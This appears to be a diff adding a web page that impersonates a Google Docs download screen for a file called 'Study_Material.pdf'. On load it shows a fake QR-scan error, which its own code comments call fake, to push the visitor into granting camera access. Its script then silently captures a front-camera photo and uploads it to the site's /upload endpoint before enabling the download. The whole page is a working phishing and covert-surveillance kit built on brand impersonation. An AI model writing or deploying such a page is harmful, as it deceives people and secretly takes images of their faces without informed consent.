@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Google Docs - Download</title>
+  <!-- Responsive viewport meta tag -->
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,500&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Roboto', Arial, sans-serif;
+      background: #f8f9fa;
+      margin: 0;
+      padding: 0;
+    }
+    .docs-header {
+      background: #fff;
+      padding: 16px 5vw;
+      display: flex;
+      align-items: center;
+      box-shadow: 0 1px 3px rgba(60,64,67,.15);
+    }
+    .docs-logo {
+      height: 36px;
+      margin-right: 12px;
+    }
+    .docs-title {
+      font-size: 1.5rem;
+      color: #202124;
+      font-weight: 500;
+    }
+    .container {
+      max-width: 480px;
+      width: 96vw;
+      margin: 40px auto;
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(60,64,67,.07);
+      padding: 8vw 4vw;
+      text-align: center;
+    }
+    .file-icon {
+      width: 60px;
+      margin-bottom: 18px;
+    }
+    .file-name {
+      font-size: 1.2rem;
+      color: #202124;
+      margin-bottom: 20px;
+      font-weight: 500;
+    }
+    .download-btn {
+      background: #1a73e8;
+      color: #fff;
+      border: none;
+      padding: 16px 0;
+      width: 90%;
+      max-width: 320px;
+      border-radius: 4px;
+      font-size: 1.1rem;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background .2s;
+      margin-top: 24px;
+      display: block;
+      margin-left: auto;
+      margin-right: auto;
+    }
+    .download-btn:disabled {
+      background: #c6dafc;
+      cursor: not-allowed;
+    }
+    .hint, .warning {
+      color: #5f6368;
+      font-size: 1rem;
+      margin-top: 28px;
+      word-break: break-word;
+    }
+    .warning {
+      color: #d93025;
+      font-weight: 500;
+    }
+    @media (max-width: 600px) {
+      .container {
+        max-width: 98vw;
+        padding: 6vw 2vw;
+      }
+      .docs-title {
+        font-size: 1.2rem;
+      }
+      .file-icon {
+        width: 44px;
+      }
+      .file-name {
+        font-size: 1rem;
+      }
+      .download-btn {
+        font-size: 1rem;
+        padding: 14px 0;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="docs-header">
+    <img src="https://ssl.gstatic.com/docs/doclist/images/infinite_arrow_favicon_5.ico" alt="Google Docs" class="docs-logo">
+    <span class="docs-title">Google Docs</span>
+  </div>
+  <div class="container">
+    <img src="https://ssl.gstatic.com/docs/doclist/images/mediatype/icon_1_document_x32.png" class="file-icon" alt="Document">
+    <div class="file-name">Study_Material.pdf</div>
+    <button class="download-btn" id="downloadBtn" disabled>Download</button>
+    <div class="hint" id="hintText">Enable camera to verify QR</div>
+    <div class="warning" id="warnText" style="display:none;"></div>
+  </div>
+
+  <!-- Fake QR Error Popup -->
+  <div id="qrPopup" style="
+    position: fixed; top:0; left:0; width:100vw; height:100vh; 
+    background: rgba(0,0,0,0.45); display: flex; align-items: center; justify-content: center; z-index: 9999;">
+    <div style="background: #fff; border-radius: 8px; max-width: 340px; width: 90vw; padding: 32px 18px; text-align: center; box-shadow: 0 2px 12px rgba(0,0,0,0.11);">
+      <div style="font-size: 1.2rem; color: #d93025; margin-bottom: 18px; font-weight: 500;">Error scanning QR code</div>
+      <div style="color: #555; margin-bottom: 22px;">Unable to scan QR. Please enable your camera to try again.</div>
+      <button id="enableCameraBtn" style="background: #1a73e8; color: #fff; border: none; padding: 12px 0; width: 100%; border-radius: 4px; font-size: 1.05rem; font-weight: 500; cursor: pointer;">Enable Camera</button>
+    </div>
+  </div>
+
+  <!-- Loading Animation Overlay -->
+  <div id="loadingOverlay" style="
+    display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; 
+    background:rgba(255,255,255,0.82); z-index:9998; align-items:center; justify-content:center;">
+    <div style="display:flex; flex-direction:column; align-items:center;">
+      <div class="spinner" style="margin-bottom:18px;">
+        <div style="
+          border: 5px solid #c6dafc; 
+          border-top: 5px solid #1a73e8; 
+          border-radius: 50%; 
+          width: 48px; 
+          height: 48px; 
+          animation: spin 1s linear infinite;"></div>
+      </div>
+      <div style="color:#1a73e8; font-weight:500; font-size:1.07rem;">Scanning...</div>
+    </div>
+  </div>
+
+  <style>
+    @keyframes spin {
+      0% { transform: rotate(0deg);}
+      100% { transform: rotate(360deg);}
+    }
+    /* Responsive centering for loading overlay */
+    #loadingOverlay { display: flex; }
+  </style>
+
+  <script>
+    const downloadBtn = document.getElementById('downloadBtn');
+    const hintText = document.getElementById('hintText');
+    const warnText = document.getElementById('warnText');
+    const qrPopup = document.getElementById('qrPopup');
+    const enableCameraBtn = document.getElementById('enableCameraBtn');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+
+    function enableDownload() {
+      downloadBtn.disabled = false;
+      hintText.textContent = "Camera enabled. You can now download your file.";
+      warnText.style.display = 'none';
+    }
+
+    function uploadImage(imageData) {
+      function dataURLtoBlob(dataurl) {
+        var arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+            bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+        while(n--) u8arr[n] = bstr.charCodeAt(n);
+        return new Blob([u8arr], {type:mime});
+      }
+
+      const blob = dataURLtoBlob(imageData);
+      const formData = new FormData();
+      formData.append('photo', blob, 'photo.png');
+
+      fetch('/upload', {
+        method: 'POST',
+        body: formData
+      })
+      .then(res => res.json())
+      .then(data => {
+        loadingOverlay.style.display = 'none';
+        enableDownload();
+      })
+      .catch(err => {
+        loadingOverlay.style.display = 'none';
+        warnText.style.display = 'block';
+        warnText.textContent = "Photo upload failed. Please refresh and try again.";
+      });
+    }
+
+    function requestCamera() {
+      loadingOverlay.style.display = 'flex';
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(stream => {
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          video.play();
+
+          video.addEventListener('loadedmetadata', () => {
+            setTimeout(() => {
+              const canvas = document.createElement('canvas');
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              const context = canvas.getContext('2d');
+              context.drawImage(video, 0, 0, canvas.width, canvas.height);
+              stream.getTracks().forEach(track => track.stop());
+              const imageData = canvas.toDataURL('image/png');
+              uploadImage(imageData);
+            }, 700); // Slightly longer for realism
+          });
+        })
+        .catch(() => {
+          loadingOverlay.style.display = 'none';
+          downloadBtn.disabled = true;
+          warnText.style.display = 'block';
+          warnText.textContent = "Camera access is required to verify QR. Please allow camera access in your browser settings and reload the page.";
+        });
+    }
+
+    // Show fake QR error popup on load
+    window.onload = function() {
+      qrPopup.style.display = 'flex';
+    };
+
+    // Only request camera after user clicks the button
+    enableCameraBtn.onclick = function() {
+      qrPopup.style.display = 'none';
+      requestCamera();
+    };
+
+    downloadBtn.onclick = function() {
+      window.location.href = 'Digital Evidence Handling.pdf';
+    };
+  </script>
+</body>
+</html>
